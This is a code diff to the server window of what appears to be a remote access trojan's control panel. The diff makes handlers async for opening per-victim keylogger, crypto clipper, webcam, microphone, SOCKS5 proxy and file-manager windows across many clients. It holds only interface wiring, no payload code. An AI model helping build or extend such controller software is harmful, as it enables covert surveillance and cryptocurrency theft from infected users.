@@ -637,68 +637,82 @@ public partial class ServerWindow : Window
         Log($"[*] Remote webcam opened for {clients.Count} client(s).");
     }
 
-    private void TcpManager_Click(object sender, RoutedEventArgs e)
+    private async void TcpManager_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<TcpManagerWindow>(c.Id, () =>
-                new TcpManagerWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<TcpManagerWindow>(c.Id, () => new TcpManagerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
     }
 
-    private void StartupManager_Click(object sender, RoutedEventArgs e)
+    private async void StartupManager_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<StartupManagerWindow>(c.Id, () =>
-                new StartupManagerWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<StartupManagerWindow>(c.Id, () => new StartupManagerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
     }
 
-    private void FileManager_Click(object sender, RoutedEventArgs e)
+    private async void FileManager_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<FileManagerWindow>(c.Id, () =>
-                new FileManagerWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<FileManagerWindow>(c.Id, () => new FileManagerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
     }
 
-    private void Microphone_Click(object sender, RoutedEventArgs e)
+    private async void Microphone_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<MicrophoneWindow>(c.Id, () =>
-                new MicrophoneWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<MicrophoneWindow>(c.Id, () => new MicrophoneWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
     }
 
-    private void Fun_Click(object sender, RoutedEventArgs e)
+    private async void Fun_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<FunWindow>(c.Id, () =>
-                new FunWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<FunWindow>(c.Id, () => new FunWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
     }
 
-    private void ProcessManager_Click(object sender, RoutedEventArgs e)
+    private async void ProcessManager_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<ProcessManagerWindow>(c.Id, () =>
-                new ProcessManagerWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<ProcessManagerWindow>(c.Id, () => new ProcessManagerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
         Log($"[*] Process Manager opened for {clients.Count} client(s).");
     }
 
-    private void Socks5_Click(object sender, RoutedEventArgs e)
+    private async void Socks5_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<Socks5Window>(c.Id, () =>
-                new Socks5Window(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<Socks5Window>(c.Id, () => new Socks5Window(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
     }
 
     private TikTokWindow? _tikTokWindow;
@@ -714,23 +728,27 @@ public partial class ServerWindow : Window
             _tikTokWindow.Activate();
     }
 
-    private void Keylogger_Click(object sender, RoutedEventArgs e)
+    private async void Keylogger_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<KeyloggerWindow>(c.Id, () =>
-                new KeyloggerWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<KeyloggerWindow>(c.Id, () => new KeyloggerWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
         Log($"[*] Keylogger opened for {clients.Count} client(s).");
     }
 
-    private void CryptoClipper_Click(object sender, RoutedEventArgs e)
+    private async void CryptoClipper_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
-            OpenFeatureWindow<CryptoClipperWindow>(c.Id, () =>
-                new CryptoClipperWindow(_server, c.Id, c.Id));
+        {
+            OpenFeatureWindow<CryptoClipperWindow>(c.Id, () => new CryptoClipperWindow(_server, c.Id, c.Id));
+            if (clients.Count > 1) await Task.Delay(80);
+        }
         Log($"[*] Crypto Clipper opened for {clients.Count} client(s).");
     }
 
